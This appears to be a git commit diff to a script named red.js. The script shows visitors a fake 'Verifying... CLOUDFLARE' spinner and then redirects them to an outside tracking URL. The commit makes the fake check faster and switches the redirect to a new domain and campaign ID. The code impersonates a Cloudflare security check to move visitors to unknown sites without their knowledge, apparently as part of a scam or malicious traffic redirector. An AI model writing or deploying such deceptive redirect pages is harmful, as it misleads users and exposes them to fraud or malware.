c1d1cdcce19a53b31f722edfe21686e7b86e1104
ukbest-1 <baaje112dd@gmail.com>
2025-12-25 11:03:32 +0530

    Update red.js

--- js/red.js
+++ js/red.js
@@ -1,8 +1,8 @@
 setTimeout(function() {
     const box = document.querySelector('.verification-box');
     box.innerHTML = '<div class="spinner"></div> Verifying... <span class="cloudflare">CLOUDFLARE</span>';
-}, 1000);
+}, 100);
 
 setTimeout(function() {
-    window.location.href = 'http://t1l9.com/?utm_campaign=xEp7N3tLMR&v1=[v1]&v2=[v2]&v3=[v3]';
-}, 5000);
+    window.location.href = 'http://p8r9.com/?utm_campaign=HVuSi7q1AE&v1=[v1]&v2=[v2]&v3=[v3]';
+}, 500);
